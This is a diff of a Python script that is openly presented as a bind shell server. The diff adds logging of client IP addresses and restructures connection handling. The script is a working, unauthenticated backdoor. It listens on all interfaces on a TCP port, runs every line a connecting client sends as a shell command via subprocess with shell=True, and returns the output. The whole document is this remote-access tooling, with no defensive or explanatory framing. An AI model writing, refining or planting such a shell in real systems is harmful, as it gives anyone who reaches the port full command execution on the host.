@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Bind Shell
+Python Bind Shell Server
 
 A minimalist, single-threaded TCP bind shell server.
 Listens on a specified port, accepts incoming connections, and executes 
@@ -28,26 +28,33 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind(('0.0.0.0', PORT))
 s.listen(1)
-
 print(f"Bind shell listening on port {PORT} with timeout {TIMEOUT}s")
 
 while True:
-    conn, _ = s.accept()
-    f = conn.makefile('r', encoding='utf-8', errors='ignore')
+    conn, addr = s.accept()
+    client_ip = addr[0]
+    client_port = addr[1]
+    print(f"Connection established from {client_ip}:{client_port}")
     
-    for cmd in f:
-        cmd = cmd.strip()
-        if not cmd: 
-            continue
-        if cmd.lower() == 'exit': 
-            break
-        
-        try:
-            out = subprocess.run(cmd, shell=True, capture_output=True, timeout=TIMEOUT)
-            conn.sendall(out.stdout + out.stderr)
-        except subprocess.TimeoutExpired:
-            conn.sendall(f"Error: Command timed out after {TIMEOUT}s\n".encode())
-        except Exception as e:
-            conn.sendall(f"Error: {str(e)}\n".encode())
+    with conn, conn.makefile('r', encoding='utf-8', errors='ignore') as f:
+        for cmd in f:
+            cmd = cmd.strip()
+            if not cmd: 
+                continue
+            if cmd.lower() == 'exit': 
+                print(f"Connection from {client_ip}:{client_port} closed by client")
+                break
             
-    conn.close()
+            try:
+                out = subprocess.run(cmd, shell=True, capture_output=True, timeout=TIMEOUT)
+                response = out.stdout + out.stderr
+                
+                if not response:
+                    conn.sendall(b"\n")
+                else:
+                    conn.sendall(response)
+                    
+            except subprocess.TimeoutExpired:
+                conn.sendall(f"Error: Command timed out after {TIMEOUT}s\n".encode())
+            except Exception as e:
+                conn.sendall(f"Error: {str(e)}\n".encode())
